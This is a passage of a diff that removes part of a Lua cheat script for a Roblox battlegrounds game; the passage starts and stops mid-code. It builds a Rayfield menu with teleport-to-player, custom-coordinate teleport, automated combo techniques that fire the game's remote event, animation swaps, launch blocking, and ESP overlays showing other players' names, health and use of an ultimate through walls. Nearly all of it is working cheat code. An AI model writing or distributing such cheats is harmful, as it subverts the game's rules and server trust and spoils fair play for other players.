-                local tl = mh and mh:FindFirstChild("TextLabel")
-                if tl then tl.Text = "Let's Get Crazy" end
-            end)
-        end)
-
-        -- Animation replacements (trigger anim ID → replacement anim ID, speed, startTime)
-        local simpleSwaps = {
-            { src=10468665991, dst="13073745835",   spd=0.9, st=0,   adjSpd0=0.1 },
-            { src=10466974800, dst="13560306510",   spd=3,   st=0,   adjSpd0=4   },
-            { src=10471336737, dst="10469643643",   spd=1,   st=0.5, adjSpd0=0,  stopAfter=1.8 },
-            { src=12510170988, dst="13813955149",   spd=1,   st=0,   adjSpd0=0   },
-            { src=11343318134, dst="12983333733",   spd=0.5, st=2,   adjSpd0=0   },
-            { src=15955393872, dst="15943915877",   spd=1,   st=0.05,adjSpd0=0   },
-            { src=12983333733, dst="13073745835",   spd=0.2, st=0,   adjSpd0=0   },
-            { src=12447707844, dst="18435303746",   spd=1,   st=0,   adjSpd0=0   },
-            { src=10479335397, dst="17838006839",   spd=0.7, st=0,   adjSpd0=0,  stopAfter=1.2 },
-            { src=10503381238, dst="14900168720",   spd=0.7, st=1.3, adjSpd0=0   },
-            { src=10470104242, dst="12447247483",   spd=6,   st=0,   adjSpd0=0,  waitBefore=0.2 },
-        }
-
-        for _, s in ipairs(simpleSwaps) do
-            local swap = s
-            hum.AnimationPlayed:Connect(function(track)
-                if track.Animation.AnimationId == "rbxassetid://" .. swap.src then
-                    for _, t in pairs(hum:GetPlayingAnimationTracks()) do t:Stop() end
-                    local a = Instance.new("Animation")
-                    a.AnimationId = "rbxassetid://" .. swap.dst
-                    local loaded = hum:LoadAnimation(a)
-                    if swap.waitBefore then task.wait(swap.waitBefore) end
-                    loaded:Play()
-                    loaded:AdjustSpeed(swap.adjSpd0 or 0)
-                    loaded.TimePosition = swap.st
-                    loaded:AdjustSpeed(swap.spd)
-                    if swap.stopAfter then
-                        task.delay(swap.stopAfter, function() loaded:Stop() end)
-                    end
-                end
-            end)
-        end
-
-        -- Queued animation set (M1 chain)
-        local stopSet = {[17859015788]=true,[10469493270]=true,[10469630950]=true,
-                         [10469639222]=true,[10469643643]=true}
-        local repMap  = {
-            ["17859015788"]="rbxassetid://12684185971",
-            ["10469643643"]="rbxassetid://17889290569",
-            ["10469639222"]="rbxassetid://17889471098",
-            ["10469630950"]="rbxassetid://17889461810",
-            ["10469493270"]="rbxassetid://17889458563",
-            ["11365563255"]="rbxassetid://14516273501",
-        }
-        local queue2, isAnim = {}, false
-        local function playRep(animId)
-            if isAnim then table.insert(queue2, animId); return end
-            isAnim = true
-            local rep = repMap[tostring(animId)]
-            if rep then
-                local a = Instance.new("Animation"); a.AnimationId = rep
-                local loaded = hum:LoadAnimation(a); loaded:Play()
-                loaded.Stopped:Connect(function()
-                    isAnim = false
-                    if #queue2 > 0 then playRep(table.remove(queue2,1)) end
-                end)
-            else isAnim = false end
-        end
-        hum.AnimationPlayed:Connect(function(track)
-            local id = tonumber(track.Animation.AnimationId:match("%d+"))
-            if stopSet[id] then
-                for _, t in ipairs(hum:GetPlayingAnimationTracks()) do
-                    if stopSet[tonumber(t.Animation.AnimationId:match("%d+"))] then t:Stop() end
-                end
-                track:Stop(); playRep(id)
-            end
-        end)
-
-        -- Block Y BodyVelocity (prevent launch)
-        local function patchBV(d)
-            if d:IsA("BodyVelocity") then
-                d.Velocity = Vector3.new(d.Velocity.X, 0, d.Velocity.Z)
-            end
-        end
-        for _, d in pairs(char:GetDescendants()) do patchBV(d) end
-        char.DescendantAdded:Connect(patchBV)
-
-        Rayfield:Notify({ Title="Moveset", Content="Gojo Satoru loaded!", Duration=3, Image=4483362458 })
-    end)
-end
-
-movesetTab:CreateButton({ Name = "Gojo Satoru", Callback = runGojoMoveset })
-
-movesetTab:CreateDivider()
-movesetTab:CreateLabel("Movesets update soon.")
-
--------------------------------------------------------------------------------
--- ═══ TAB: COMBAT ═══
--------------------------------------------------------------------------------
-local autoFarmTab = Window:CreateTab("⚔ Combat", "zap")
-
--- ── TP to Player (player picker popup) ────────────────────────────────────────
-autoFarmTab:CreateSection("Teleport to Player")
-autoFarmTab:CreateLabel("Opens a list of all players on the server. Click a name to teleport.")
-
--- Player picker popup (separate ScreenGui so it floats above the main window)
-local pickerGui = Instance.new("ScreenGui")
-pickerGui.Name           = "BH_PlayerPicker"
-pickerGui.ResetOnSpawn   = false
-pickerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-pcall(function() pickerGui.Parent = game:GetService("CoreGui") end)
-if not pickerGui.Parent then
-    pickerGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-end
-
-local pickerFrame = Instance.new("Frame", pickerGui)
-pickerFrame.Name             = "Picker"
-pickerFrame.Size             = UDim2.new(0, 200, 0, 240)
-pickerFrame.Position         = UDim2.new(0.5, -100, 0.5, -120)
-pickerFrame.BackgroundColor3 = Color3.fromRGB(10, 12, 28)
-pickerFrame.BorderSizePixel  = 0
-pickerFrame.Visible          = false
-pickerFrame.Active           = true
-Instance.new("UICorner", pickerFrame).CornerRadius = UDim.new(0, 8)
-local pkStroke = Instance.new("UIStroke", pickerFrame)
-pkStroke.Color     = Color3.fromRGB(0, 200, 255)
-pkStroke.Thickness = 1
-
--- Drag for picker
-local pkDrag, pkDragStart, pkDragPos = false, nil, nil
-local pkTitleBar = Instance.new("TextLabel", pickerFrame)
-pkTitleBar.Size               = UDim2.new(1, -30, 0, 28)
-pkTitleBar.BackgroundTransparency = 1
-pkTitleBar.Text               = "Select Player"
-pkTitleBar.TextColor3         = Color3.fromRGB(0, 200, 255)
-pkTitleBar.Font               = Enum.Font.GothamBold
-pkTitleBar.TextSize           = 13
-pkTitleBar.TextXAlignment     = Enum.TextXAlignment.Left
-pkTitleBar.Position           = UDim2.new(0, 8, 0, 0)
-
-local pkClose = Instance.new("TextButton", pickerFrame)
-pkClose.Size             = UDim2.new(0, 22, 0, 22)
-pkClose.Position         = UDim2.new(1, -26, 0, 3)
-pkClose.BackgroundColor3 = Color3.fromRGB(190, 40, 40)
-pkClose.Text             = "✕"
-pkClose.TextColor3       = Color3.fromRGB(255, 255, 255)
-pkClose.Font             = Enum.Font.GothamBold
-pkClose.TextSize         = 11
-Instance.new("UICorner", pkClose).CornerRadius = UDim.new(0, 4)
-pkClose.MouseButton1Click:Connect(function() pickerFrame.Visible = false end)
-
--- Picker drag
-pickerFrame.InputBegan:Connect(function(inp)
-    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
-        pkDrag      = true
-        pkDragStart = UserInputService:GetMouseLocation()
-        pkDragPos   = pickerFrame.Position
-    end
-end)
-UserInputService.InputChanged:Connect(function(inp)
-    if pkDrag and inp.UserInputType == Enum.UserInputType.MouseMovement then
-        local cur   = UserInputService:GetMouseLocation()
-        local delta = cur - pkDragStart
-        pickerFrame.Position = UDim2.new(
-            pkDragPos.X.Scale, pkDragPos.X.Offset + delta.X,
-            pkDragPos.Y.Scale, pkDragPos.Y.Offset + delta.Y
-        )
-    end
-end)
-UserInputService.InputEnded:Connect(function(inp)
-    if inp.UserInputType == Enum.UserInputType.MouseButton1 then pkDrag = false end
-end)
-
--- Divider line under title
-local pkLine = Instance.new("Frame", pickerFrame)
-pkLine.Size             = UDim2.new(1, -8, 0, 1)
-pkLine.Position         = UDim2.new(0, 4, 0, 28)
-pkLine.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
-pkLine.BackgroundTransparency = 0.6
-pkLine.BorderSizePixel  = 0
-
--- Scrollable player list
-local pkScroll = Instance.new("ScrollingFrame", pickerFrame)
-pkScroll.Size                   = UDim2.new(1, -8, 1, -36)
-pkScroll.Position               = UDim2.new(0, 4, 0, 32)
-pkScroll.BackgroundTransparency = 1
-pkScroll.BorderSizePixel        = 0
-pkScroll.ScrollBarThickness     = 3
-pkScroll.ScrollBarImageColor3   = Color3.fromRGB(0, 200, 255)
-pkScroll.CanvasSize             = UDim2.new(0, 0, 0, 0)
-local pkLayout = Instance.new("UIListLayout", pkScroll)
-pkLayout.Padding   = UDim.new(0, 3)
-pkLayout.SortOrder = Enum.SortOrder.LayoutOrder
-pkLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    pkScroll.CanvasSize = UDim2.new(0, 0, 0, pkLayout.AbsoluteContentSize.Y + 6)
-end)
-
-local function openPlayerPicker()
-    -- Rebuild list fresh each time
-    for _, c in ipairs(pkScroll:GetChildren()) do
-        if c:IsA("TextButton") then c:Destroy() end
-    end
-    local order = 0
-    for _, plr in ipairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer then
-            order = order + 1
-            local pb = Instance.new("TextButton", pkScroll)
-            pb.Size             = UDim2.new(1, 0, 0, 30)
-            pb.BackgroundColor3 = Color3.fromRGB(14, 18, 36)
-            pb.BorderSizePixel  = 0
-            pb.Text             = plr.Name
-            pb.TextColor3       = Color3.fromRGB(215, 230, 255)
-            pb.Font             = Enum.Font.Gotham
-            pb.TextSize         = 12
-            pb.LayoutOrder      = order
-            Instance.new("UICorner", pb).CornerRadius = UDim.new(0, 5)
-            local pbStroke = Instance.new("UIStroke", pb)
-            pbStroke.Color     = Color3.fromRGB(30, 40, 80)
-            pbStroke.Thickness = 1
-            pb.MouseEnter:Connect(function()
-                pb.BackgroundColor3 = Color3.fromRGB(0, 50, 90)
-                pbStroke.Color      = Color3.fromRGB(0, 200, 255)
-            end)
-            pb.MouseLeave:Connect(function()
-                pb.BackgroundColor3 = Color3.fromRGB(14, 18, 36)
-                pbStroke.Color      = Color3.fromRGB(30, 40, 80)
-            end)
-            local capturedPlr = plr
-            pb.MouseButton1Click:Connect(function()
-                pickerFrame.Visible = false
-                local myHRP = humanoidRootPart
-                if not myHRP then
-                    Rayfield:Notify({ Title="Combat", Content="No character!", Duration=3, Image=4483362458 })
-                    return
-                end
-                local tChar = capturedPlr.Character
-                local tHRP  = tChar and tChar:FindFirstChild("HumanoidRootPart")
-                if not tHRP then
-                    Rayfield:Notify({ Title="Combat", Content=capturedPlr.Name .. " has no character!", Duration=3, Image=4483362458 })
-                    return
-                end
-                myHRP.CFrame = tHRP.CFrame + Vector3.new(0, 3, 0)
-                Rayfield:Notify({ Title="Combat", Content="Teleported to " .. capturedPlr.Name, Duration=3, Image=4483362458 })
-            end)
-        end
-    end
-    if order == 0 then
-        local nob = Instance.new("TextLabel", pkScroll)
-        nob.Size = UDim2.new(1, 0, 0, 30)
-        nob.BackgroundTransparency = 1
-        nob.Text = "No other players"
-        nob.TextColor3 = Color3.fromRGB(130, 150, 190)
-        nob.Font = Enum.Font.Gotham
-        nob.TextSize = 12
-        nob.LayoutOrder = 1
-    end
-    pickerFrame.Visible = true
-end
-
-autoFarmTab:CreateButton({
-    Name = "Select Player & Teleport",
-    Callback = function() openPlayerPicker() end,
-})
-
--------------------------------------------------------------------------------
--- ═══ TAB: AVATAR LOADER ═══
--------------------------------------------------------------------------------
-local avatarTab = Window:CreateTab("👤 Avatar", "user")
-
-local avatarUserId   = ""
-local avatarApplying = false
-
--- ── Pure visual helpers (no ApplyDescription / server calls) ────────────────
-
--- Strip all visual decorations from the character (client-side only)
-local function clearVisuals(char)
-    for _, c in ipairs(char:GetChildren()) do
-        if c:IsA("Accessory") or c:IsA("Hat") or c:IsA("Shirt") or
-           c:IsA("Pants") or c:IsA("ShirtGraphic") or c:IsA("CharacterMesh") then
-            pcall(function() c:Destroy() end)
-        end
-    end
-    -- Remove face decal from Head
-    local head = char:FindFirstChild("Head")
-    if head then
-        for _, d in ipairs(head:GetChildren()) do
-            if d:IsA("Decal") and d.Name:lower() == "face" then
-                pcall(function() d:Destroy() end)
-            end
-        end
-    end
-    -- Remove BodyColors so skin colour is fully replaced
-    local bc = char:FindFirstChildOfClass("BodyColors")
-    if bc then pcall(function() bc:Destroy() end) end
-end
-
--- Attach an accessory visually using WeldConstraint + Attachment name matching
-local function attachAccessory(char, accessory)
-    local handle = accessory:FindFirstChild("Handle")
-    if not handle then return end
-    local targetAtt, accAtt
-    for _, part in ipairs(char:GetChildren()) do
-        if part:IsA("BasePart") then
-            for _, att in ipairs(part:GetChildren()) do
-                if att:IsA("Attachment") then
-                    local match = handle:FindFirstChild(att.Name)
-                    if match and match:IsA("Attachment") then
-                        targetAtt = att
-                        accAtt    = match
-                        break
-                    end
-                end
-            end
-        end
-        if targetAtt then break end
-    end
-    if targetAtt and accAtt then
-        handle.CFrame = targetAtt.WorldCFrame * accAtt.CFrame:Inverse()
-    else
-        local root = char:FindFirstChild("HumanoidRootPart")
-        if root then handle.CFrame = root.CFrame end
-    end
-    local weld   = Instance.new("WeldConstraint")
-    weld.Part0   = handle
-    weld.Part1   = (targetAtt and targetAtt.Parent)
-                or char:FindFirstChild("HumanoidRootPart")
-                or char:FindFirstChild("Head")
-    weld.Parent  = handle
-    accessory.Parent = char
-end
-
--- Apply appearance from any userId — purely visual, no server side-effects
-local function applyVisual(userId)
-    if avatarApplying then
-        Rayfield:Notify({ Title="Avatar", Content="Already applying, please wait...", Duration=2, Image=4483362458 })
-        return
-    end
-    avatarApplying = true
-    Rayfield:Notify({ Title="Avatar", Content="Loading appearance...", Duration=2, Image=4483362458 })
-    task.spawn(function()
-        local char = LocalPlayer.Character
-        if not char or not char:FindFirstChild("HumanoidRootPart") then
-            avatarApplying = false
-            Rayfield:Notify({ Title="Avatar", Content="No character!", Duration=3, Image=4483362458 })
-            return
-        end
-        local ok, model = pcall(function()
-            return Players:GetCharacterAppearanceAsync(userId)
-        end)
-        if not ok or not model then
-            avatarApplying = false
-            Rayfield:Notify({ Title="Avatar", Content="Failed to load appearance!", Duration=4, Image=4483362458 })
-            return
-        end
-        clearVisuals(char)
-        -- Body colours
-        local bc = model:FindFirstChildOfClass("BodyColors")
-        if bc then bc:Clone().Parent = char end
-        -- Clothing
-        for _, item in ipairs(model:GetChildren()) do
-            if item:IsA("Shirt") or item:IsA("Pants") or item:IsA("ShirtGraphic") then
-                item:Clone().Parent = char
-            end
-        end
-        -- Accessories (WeldConstraint-based visual attachment)
-        for _, acc in ipairs(model:GetChildren()) do
-            if acc:IsA("Accessory") or acc:IsA("Hat") then
-                pcall(function() attachAccessory(char, acc:Clone()) end)
-            end
-        end
-        -- Face decal
-        local head = char:FindFirstChild("Head")
-        if head then
-            local face = model:FindFirstChild("face", true)
-            if face and face:IsA("Decal") then face:Clone().Parent = head end
-        end
-        model:Destroy()
-        avatarApplying = false
-        Rayfield:Notify({ Title="Avatar", Content="Skin applied!", Duration=3, Image=4483362458 })
-    end)
-end
-
--- ── Avatar tab UI ────────────────────────────────────────────────────────────
-
-avatarTab:CreateSection("⚠ Warning")
-avatarTab:CreateLabel("To avoid bugs, remove all accessories from your avatar before applying a skin.")
-
-avatarTab:CreateSection("Load Avatar by User ID")
-avatarTab:CreateInput({
-    Name                     = "User ID",
-    PlaceholderText          = "e.g. 1234567890",
-    Flag                     = "AvatarUserId",
-    RemoveTextAfterFocusLost = false,
-    Callback                 = function(v) avatarUserId = v end,
-})
-
-avatarTab:CreateButton({
-    Name = "Apply Skin",
-    Callback = function()
-        local uid = tonumber(avatarUserId)
-        if not uid then
-            Rayfield:Notify({ Title="Avatar", Content="Invalid User ID!", Duration=3, Image=4483362458 })
-            return
-        end
-        applyVisual(uid)
-    end,
-})
-
-avatarTab:CreateButton({
-    Name = "Reset Avatar",
-    Callback = function()
-        -- Re-applies the player's own appearance using the same visual path
-        applyVisual(LocalPlayer.UserId)
-    end,
-})
-
-
--------------------------------------------------------------------------------
--- ═══ TAB: TELEPORT ═══
--------------------------------------------------------------------------------
-local tpTab = Window:CreateTab("🌍 Teleport", "map-pin")
-
-tpTab:CreateSection("Locations")
-
-local Locations = {
-    { name="Middle (Centre Map)",    pos=CFrame.new(148, 441, 27)       },
-    { name="Death Counter Room",     pos=CFrame.new(-92, 29, 20347)     },
-    { name="Mountain 1",             pos=CFrame.new(266, 699, 458)      },
-}
-
-for _, loc in ipairs(Locations) do
-    tpTab:CreateButton({
-        Name = loc.name,
-        Callback = function()
-            if humanoidRootPart then
-                humanoidRootPart.CFrame = loc.pos
-                Rayfield:Notify({
-                    Title   = "Teleport",
-                    Content = "→ " .. loc.name,
-                    Duration = 2,
-                    Image   = 4483362458,
-                })
-            end
-        end,
-    })
-end
-
-tpTab:CreateSection("Custom Position")
-local customX, customY, customZ = 0, 0, 0
-tpTab:CreateInput({ Name="X", PlaceholderText="0", Flag="TpX", RemoveTextAfterFocusLost=false,
-    Callback=function(v) customX = tonumber(v) or 0 end })
-tpTab:CreateInput({ Name="Y", PlaceholderText="0", Flag="TpY", RemoveTextAfterFocusLost=false,
-    Callback=function(v) customY = tonumber(v) or 0 end })
-tpTab:CreateInput({ Name="Z", PlaceholderText="0", Flag="TpZ", RemoveTextAfterFocusLost=false,
-    Callback=function(v) customZ = tonumber(v) or 0 end })
-tpTab:CreateButton({
-    Name = "Teleport to Coordinates",
-    Callback = function()
-        if humanoidRootPart then
-            humanoidRootPart.CFrame = CFrame.new(customX, customY, customZ)
-            Rayfield:Notify({ Title="Teleport", Content=customX..", "..customY..", "..customZ, Duration=2, Image=4483362458 })
-        end
-    end,
-})
-
--------------------------------------------------------------------------------
--- ═══ TAB: AUTO TECH ═══
--------------------------------------------------------------------------------
-local autoTechTab = Window:CreateTab("⚡ AutoTech", "zap")
-
--- Shared animation hook helper (re-hooks on respawn)
-local function hookAnimation(animId, callback)
-    local id = tostring(animId):gsub("rbxassetid://", "")
-    local function hookChar(char)
-        local hum = char:FindFirstChildWhichIsA("Humanoid")
-            or char:WaitForChild("Humanoid", 3)
-        if not hum then return end
-        hum.AnimationPlayed:Connect(function(track)
-            local raw = track.Animation and track.Animation.AnimationId or ""
-            if tostring(raw):gsub("rbxassetid://", "") == id then
-                callback(track, char)
-            end
-        end)
-    end
-    if LocalPlayer.Character then hookChar(LocalPlayer.Character) end
-    LocalPlayer.CharacterAdded:Connect(hookChar)
-end
-
--- ── 1. Flowing Water + Dash ──────────────────────────────────────────────────
-autoTechTab:CreateSection("Combat Techs")
-
-local flowingEnabled = false
-autoTechTab:CreateToggle({
-    Name         = "Flowing Water + Dash",
-    CurrentValue = false,
-    Flag         = "AutoFlowing",
-    Callback     = function(v) flowingEnabled = v end,
-})
-
-hookAnimation("12273188754", function(track, char)
-    if not flowingEnabled then return end
-    local comm = char:FindFirstChild("Communicate")
-    if not comm then return end
-    task.wait(1.57)
-    pcall(function()
-        comm:FireServer({ Dash = Enum.KeyCode.W, Key = Enum.KeyCode.Q, Goal = "KeyPress" })
-    end)
-end)
-
--- ── 2. Auto Kyoto ────────────────────────────────────────────────────────────
-local kyotoEnabled = false
-autoTechTab:CreateToggle({
-    Name         = "Auto Kyoto",
-    CurrentValue = false,
-    Flag         = "AutoKyoto",
-    Callback     = function(v) kyotoEnabled = v end,
-})
-
-hookAnimation("12273188754", function(track, char)
-    if not kyotoEnabled then return end
-    local comm = char:FindFirstChild("Communicate")
-    if not comm then return end
-    local tool = LocalPlayer.Backpack:FindFirstChild("Lethal Whirlwind Stream")
-        or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Lethal Whirlwind Stream"))
-    if not tool then return end
-    task.wait(1.49)
-    pcall(function()
-        comm:FireServer({ Tool = tool, Goal = "Console Move" })
-        local hrp = char:FindFirstChild("HumanoidRootPart")
-        if hrp then hrp.CFrame = hrp.CFrame + hrp.CFrame.LookVector * 16 end
-    end)
-end)
-
--- ── 3. Sky Upper Dash ────────────────────────────────────────────────────────
-local skyEnabled = false
-autoTechTab:CreateToggle({
-    Name         = "Sky Upper Dash",
-    CurrentValue = false,
-    Flag         = "AutoSkyDash",
-    Callback     = function(v) skyEnabled = v end,
-})
-
-hookAnimation("10503381238", function(track, char)
-    if not skyEnabled then return end
-    local comm = char:FindFirstChild("Communicate")
-    local root = char:FindFirstChild("HumanoidRootPart")
-    if not comm or not root then return end
-    task.wait(0.5)
-    pcall(function()
-        root.CFrame = root.CFrame + Vector3.new(0, 5, 0)
-        comm:FireServer({ Dash = Enum.KeyCode.W, Key = Enum.KeyCode.Q, Goal = "KeyPress" })
-        root.Anchored = true
-        task.wait(1)
-        root.Anchored = false
-    end)
-end)
-
--- ── 4. Instant Lethal Dash ───────────────────────────────────────────────────
-local lethalEnabled = false
-autoTechTab:CreateToggle({
-    Name         = "Instant Lethal Dash",
-    CurrentValue = false,
-    Flag         = "AutoLethalDash",
-    Callback     = function(v) lethalEnabled = v end,
-})
-
-hookAnimation("12296113986", function(track, char)
-    if not lethalEnabled then return end
-    local comm = char:FindFirstChild("Communicate")
-    local root = char:FindFirstChild("HumanoidRootPart")
-    if not comm or not root then return end
-    task.wait(1.59)
-    pcall(function()
-        root.CFrame = root.CFrame + Vector3.new(0, 5, 0)
-        comm:FireServer({ Dash = Enum.KeyCode.W, Key = Enum.KeyCode.Q, Goal = "KeyPress" })
-        root.Anchored = true
-        task.wait(1)
-        root.Anchored = false
-    end)
-end)
-
--------------------------------------------------------------------------------
--- ═══ TAB: ESP ═══
--------------------------------------------------------------------------------
-local espTab = Window:CreateTab("👁 ESP", "eye")
-
--- ── Death Counter detection ──────────────────────────────────────────────────
--- Saitama's "Death Counter" ultimate in TSB adds identifiable objects to the
--- character (BoolValues / StringValues / ParticleEmitters).  We scan for them.
-local DC_KEYWORDS = { "death", "counter", "ultimate", "rage", "dc", "saitama" }
-
-local function strHasKeyword(s)
-    s = s:lower()
-    for _, kw in ipairs(DC_KEYWORDS) do
-        if s:find(kw, 1, true) then return true end
-    end
-    return false
-end
-
-local function isInDeathCounter(char)
-    if not char then return false end
-    for _, obj in ipairs(char:GetDescendants()) do
-        if strHasKeyword(obj.Name) then
-            if obj:IsA("BoolValue")   and obj.Value          then return true end
-            if obj:IsA("StringValue") and obj.Value ~= ""    then return true end
-            if obj:IsA("NumberValue") and obj.Value > 0      then return true end
-            if obj:IsA("ParticleEmitter") or obj:IsA("Beam") then return true end
-        end
-    end
-    return false
-end
-
--- ── ESP state ────────────────────────────────────────────────────────────────
-local espEnabled = false
-local espObjects = {}   -- player → { billboard, label, healthBar, healthFill }
-
-local ESP_NORMAL_COLOR = Color3.fromRGB(255, 255, 255)
-local ESP_DC_COLOR     = Color3.fromRGB(255, 50, 50)
-
-local function buildESP(player)
-    if player == LocalPlayer then return end
-    if espObjects[player] then return end
-
-    local function attach(char)
-        if not char then return end
-        local hrp = char:WaitForChild("HumanoidRootPart", 3)
-        if not hrp then return end
-
-        -- Remove stale billboard if character respawned
-        if espObjects[player] then
-            pcall(function() espObjects[player].billboard:Destroy() end)
-            espObjects[player] = nil
-        end
-
-        local bb = Instance.new("BillboardGui")
-        bb.Name         = "BasicHubESP"
-        bb.Size         = UDim2.new(0, 130, 0, 50)
-        bb.StudsOffset  = Vector3.new(0, 4, 0)
-        bb.AlwaysOnTop  = true
-        bb.MaxDistance  = 1200
-        bb.Parent       = hrp
-
-        -- Name label
-        local nameLabel = Instance.new("TextLabel", bb)
-        nameLabel.Size                  = UDim2.new(1, 0, 0.55, 0)
-        nameLabel.BackgroundTransparency = 1
-        nameLabel.TextColor3            = ESP_NORMAL_COLOR
-        nameLabel.TextStrokeTransparency = 0.5
-        nameLabel.TextStrokeColor3      = Color3.fromRGB(0, 0, 0)
-        nameLabel.Font                  = Enum.Font.GothamBold
-        nameLabel.TextSize              = 13
-        nameLabel.Text                  = player.Name
-        nameLabel.TextXAlignment        = Enum.TextXAlignment.Center
-
-        -- Health bar background
-        local hBG = Instance.new("Frame", bb)
-        hBG.Size               = UDim2.new(0.8, 0, 0, 6)
-        hBG.Position           = UDim2.new(0.1, 0, 0.7, 0)
-        hBG.BackgroundColor3   = Color3.fromRGB(40, 40, 40)
-        hBG.BorderSizePixel    = 0
-        local hBGCorner = Instance.new("UICorner", hBG)
-        hBGCorner.CornerRadius = UDim.new(1, 0)
-
-        -- Health bar fill
-        local hFill = Instance.new("Frame", hBG)
-        hFill.Size             = UDim2.new(1, 0, 1, 0)
-        hFill.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
-        hFill.BorderSizePixel  = 0
-        local hFillCorner = Instance.new("UICorner", hFill)
-        hFillCorner.CornerRadius = UDim.new(1, 0)
-
-        espObjects[player] = {
-            billboard   = bb,
-            label       = nameLabel,
-            healthBG    = hBG,
-            healthFill  = hFill,
-        }
-    end
-
-    if player.Character then attach(player.Character) end
-    player.CharacterAdded:Connect(attach)
-end
-
-local function removeESP(player)
-    if espObjects[player] then
-        pcall(function() espObjects[player].billboard:Destroy() end)
-        espObjects[player] = nil
-    end
-end
-
-local function enableESP()
-    for _, plr in ipairs(Players:GetPlayers()) do
-        buildESP(plr)
-    end
-end
-
-local function disableESP()
-    for plr in pairs(espObjects) do
-        removeESP(plr)
-    end
-end
-
--- Update labels + health bars every frame
-RunService.Heartbeat:Connect(function()
-    if not espEnabled then return end
-    for player, data in pairs(espObjects) do
-        pcall(function()
-            if not data.billboard.Parent then return end
-            local char = player.Character
-            local hum  = char and char:FindFirstChildOfClass("Humanoid")
-
-            -- Death Counter label
-            if isInDeathCounter(char) then
-                data.label.Text       = "☠ " .. player.Name .. "\n[DEATH COUNTER]"
-                data.label.TextColor3 = ESP_DC_COLOR
-            else
-                data.label.Text       = player.Name
-                data.label.TextColor3 = ESP_NORMAL_COLOR
-            end
-
-            -- Health bar
-            if hum then
-                local pct = math.clamp(hum.Health / math.max(hum.MaxHealth, 1), 0, 1)
-                data.healthFill.Size = UDim2.new(pct, 0, 1, 0)
-                if pct > 0.5 then
-                    data.healthFill.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
-                elseif pct > 0.25 then
-                    data.healthFill.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
-                else
-                    data.healthFill.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
-                end
-            end
-        end)
-    end
-end)
-
--- Player join/leave
-Players.PlayerAdded:Connect(function(plr)
-    if espEnabled then buildESP(plr) end
-end)
-Players.PlayerRemoving:Connect(function(plr)
-    removeESP(plr)
-end)
-
--- ── ESP UI ───────────────────────────────────────────────────────────────────
-espTab:CreateSection("Players")
-
-espTab:CreateToggle({
-    Name         = "Player ESP  (names + health)",
-    CurrentValue = false,
-    Flag         = "PlayerESP",
-    Callback     = function(v)
-        espEnabled = v
-        if v then enableESP() else disableESP() end
-    end,
-})
-
-espTab:CreateLabel("DeathCounter: ESP auto-highlights players using Saitama's ultimate in red.")
-
-espTab:CreateDivider()
-espTab:CreateSection("Death Counter ESP")
-espTab:CreateLabel("Separate floating window: shows 💢 when player has Death Counter skill, ☠ after.")
-
--- ── Death Counter ESP Window ─────────────────────────────────────────────────
-local dcEspGui = Instance.new("ScreenGui")
-dcEspGui.Name           = "BH_DC_ESP"
-dcEspGui.ResetOnSpawn   = false
-dcEspGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-pcall(function() dcEspGui.Parent = game:GetService("CoreGui") end)
-if not dcEspGui.Parent then dcEspGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
-
-local dcFrame = Instance.new("Frame", dcEspGui)
-dcFrame.Size             = UDim2.new(0, 250, 0, 90)
-dcFrame.Position         = UDim2.new(0.5, -125, 0.1, 0)
-dcFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-dcFrame.BorderSizePixel  = 0
-dcFrame.ClipsDescendants = true
-dcFrame.Visible          = false
-Instance.new("UICorner", dcFrame)
-
-local dcTitle = Instance.new("TextLabel", dcFrame)
-dcTitle.Size                   = UDim2.new(1, 0, 0, 28)
-dcTitle.BackgroundTransparency = 1
-dcTitle.Text                   = "ESP Death Counter"
-dcTitle.TextColor3             = Color3.fromRGB(255, 80, 80)
-dcTitle.Font                   = Enum.Font.GothamBold
-dcTitle.TextSize               = 15
-
-local dcToggleBtn = Instance.new("TextButton", dcFrame)
-dcToggleBtn.Size             = UDim2.new(1, -20, 0, 32)
-dcToggleBtn.Position         = UDim2.new(0, 10, 0, 32)
-dcToggleBtn.BackgroundColor3 = Color3.fromRGB(70, 200, 100)
-dcToggleBtn.TextColor3       = Color3.new(1, 1, 1)
-dcToggleBtn.Font             = Enum.Font.GothamSemibold
-dcToggleBtn.TextSize         = 13
-dcToggleBtn.Text             = "DC ESP: ON"
-Instance.new("UICorner", dcToggleBtn)
-
-local dcColBtn = Instance.new("TextButton", dcFrame)
-dcColBtn.Size             = UDim2.new(0, 22, 0, 22)
-dcColBtn.Position         = UDim2.new(1, -26, 0, 3)
-dcColBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-dcColBtn.TextColor3       = Color3.new(1, 1, 1)
-dcColBtn.Font             = Enum.Font.GothamBold
-dcColBtn.TextSize         = 16
-dcColBtn.Text             = "-"
-Instance.new("UICorner", dcColBtn)
-
--- Collapse / expand
-local dcExpanded = true
-dcColBtn.MouseButton1Click:Connect(function()
-    if dcExpanded then
-        TweenService:Create(dcFrame, TweenInfo.new(0.25), { Size = UDim2.new(0, 250, 0, 28) }):Play()
-        dcColBtn.Text = "+"
-        dcExpanded    = false
-    else
-        TweenService:Create(dcFrame, TweenInfo.new(0.25), { Size = UDim2.new(0, 250, 0, 90) }):Play()
-        dcColBtn.Text = "-"
-        dcExpanded    = true
-    end
-end)
-
--- DC ESP toggle
-local dcEspOn = true
-dcToggleBtn.MouseButton1Click:Connect(function()
-    dcEspOn = not dcEspOn
-    dcToggleBtn.BackgroundColor3 = dcEspOn and Color3.fromRGB(70, 200, 100) or Color3.fromRGB(100, 100, 100)
-    dcToggleBtn.Text             = dcEspOn and "DC ESP: ON" or "DC ESP: OFF"
-end)
-
--- DC ESP drag (Rayfield-style)
-local dcToggle, dcDragInput, dcDragStart, dcDragStartPos = false, nil, nil, nil
-local function applyDCDrag(input)
-    local delta = input.Position - dcDragStart
